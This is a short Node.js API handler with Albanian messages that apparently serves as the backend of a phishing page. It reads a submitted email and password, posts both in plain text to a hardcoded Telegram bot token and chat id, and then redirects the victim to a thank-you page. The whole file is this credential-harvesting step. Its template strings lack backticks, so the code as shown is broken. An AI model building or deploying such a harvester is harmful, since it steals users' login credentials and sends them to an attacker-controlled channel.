import fetch from "node-fetch";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Only POST allowed");
  }

  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email dhe password kërkohen" });
  }

  const token = "8389609435:AAEmJzVFTtNHUGFVv-04yqYrtGy-J_CFQ5A"; // vendos tokenin tënd
  const chat_id = "-1002713619472"; // vendos chat id-n tënd

  const message = 🔐 Login Attempt\nEmail: ${email}\nPassword: ${password};

  const url = https://api.telegram.org/bot${token}/sendMessage;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("Telegram API error:", errorText);
      return res.status(500).json({ error: "Gabim në dërgimin e mesazhit" });
    }

    res.writeHead(302, { Location: "/thankyou.html" });
    res.end();

  } catch (error) {
    console.error("Fetch error:", error);
    res.status(500).json({ error: "Gabim serveri" });
  }
}
